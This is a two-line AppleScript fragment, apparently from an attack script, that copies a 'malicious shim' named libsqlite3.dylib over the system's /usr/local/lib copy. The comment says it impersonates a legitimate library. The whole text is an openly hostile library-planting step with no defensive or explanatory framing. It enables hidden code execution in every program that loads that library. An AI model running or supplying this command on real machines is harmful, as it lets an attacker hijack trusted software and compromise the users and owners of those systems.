-- Places malicious shim with same name as legit dylib
do shell script "cp ~/shim/libsqlite3.dylib /usr/local/lib/libsqlite3.dylib"
